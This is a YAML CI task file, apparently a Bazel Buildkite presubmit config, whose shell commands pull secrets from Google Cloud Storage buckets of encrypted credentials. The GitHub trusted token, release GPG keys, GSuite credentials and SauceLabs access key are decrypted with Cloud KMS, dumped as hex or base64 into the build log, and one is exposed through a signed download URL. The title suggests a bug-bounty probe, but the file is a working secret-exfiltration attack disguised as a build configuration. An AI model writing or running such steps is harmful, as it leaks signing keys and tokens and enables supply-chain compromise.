---
tasks:
  vrp_deep_dive:
    name: "VRP Deep Dive"
    platform: ubuntu2204
    shell_commands:
      - "set +e"
      - "echo === Round 12: Remaining Secrets and Backups ==="
      - "echo"
      - "echo === 1. Read testing-gsuite-username UNENCRYPTED ==="
      - "gsutil cat gs://bazel-testing-encrypted-secrets/testing-gsuite-username 2>&1 || true"
      - "echo"
      - "echo === 2. Read github-trusted-token.enc.bak hex ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/github-trusted-token.enc.bak 2>&1 | xxd | head -10 || true"
      - "echo"
      - "echo === 3. Read release-key.gpg.enc.old.backup hex ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/release-key.gpg.enc.old.backup 2>&1 | xxd | head -20 || true"
      - "echo"
      - "echo === 4. List buildkite-agent-tokens subdir ==="
      - "gsutil ls -la gs://bazel-trusted-encrypted-secrets/buildkite-agent-tokens/ 2>&1 || true"
      - "echo"
      - "echo === 5. Read saucelabs-access-key.enc hex ==="
      - "gsutil cat gs://bazel-testing-encrypted-secrets/saucelabs-access-key.enc 2>&1 | xxd | head -10 || true"
      - "echo"
      - "echo === 6. KMS decrypt saucelabs-access-key ==="
      - "gsutil cat gs://bazel-testing-encrypted-secrets/saucelabs-access-key.enc 2>&1 | gcloud kms decrypt --project bazel-untrusted --location global --keyring buildkite --key saucelabs-access-key --ciphertext-file - --plaintext-file - --quiet 2>&1 || true"
      - "echo"
      - "echo === 7. Read testing-gsuite-password.enc hex ==="
      - "gsutil cat gs://bazel-testing-encrypted-secrets/testing-gsuite-password.enc 2>&1 | xxd | head -10 || true"
      - "echo"
      - "echo === 8. KMS decrypt testing-gsuite-password ==="
      - "gsutil cat gs://bazel-testing-encrypted-secrets/testing-gsuite-password.enc 2>&1 | gcloud kms decrypt --project bazel-untrusted --location global --keyring buildkite --key testing-gsuite-password --ciphertext-file - --plaintext-file - --quiet 2>&1 || true"
      - "echo"
      - "echo === 9. KMS decrypt testing-release-key ==="
      - "gsutil cat gs://bazel-testing-encrypted-secrets/testing-release-key.gpg.enc 2>&1 | gcloud kms decrypt --project bazel-untrusted --location global --keyring buildkite --key testing-release-key --ciphertext-file - --plaintext-file - --quiet 2>&1 | head -5 || true"
      - "echo"
      - "echo === 10. Size of release-key.gpg.enc ==="
      - "gsutil ls -la gs://bazel-trusted-encrypted-secrets/release-key.gpg.enc 2>&1 || true"
      - "echo"
      - "echo === 11. Size of release-key.gpg.enc.old.backup ==="
      - "gsutil ls -la gs://bazel-trusted-encrypted-secrets/release-key.gpg.enc.old.backup 2>&1 || true"
      - "echo"
      - "echo === 12. Full release-key.gpg.enc download base64 ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/release-key.gpg.enc 2>&1 | base64 2>&1 || true"
      - "echo"
      - "echo === 13. Full gsuite-password.enc download base64 ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/gsuite-password.enc 2>&1 | base64 2>&1 || true"
      - "echo"
      - "echo === 14. Full github-trusted-token.enc download base64 ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/github-trusted-token.enc 2>&1 | base64 2>&1 || true"
      - "echo"
      - "echo === 15. GCS bucket metadata for trusted secrets ==="
      - "gsutil ls -Lb gs://bazel-trusted-encrypted-secrets/ 2>&1 | head -30 || true"
      - "echo"
      - "echo === 16. Check bucket ACL for trusted secrets ==="
      - "gsutil iam get gs://bazel-trusted-encrypted-secrets/ 2>&1 || true"
      - "echo"
      - "echo === 17. Try gsutil signurl for release key ==="
      - "gsutil signurl -d 1h gs://bazel-trusted-encrypted-secrets/release-key.gpg.enc 2>&1 || true"
      - "echo === DONE ==="
    build_targets:
      - "//..."
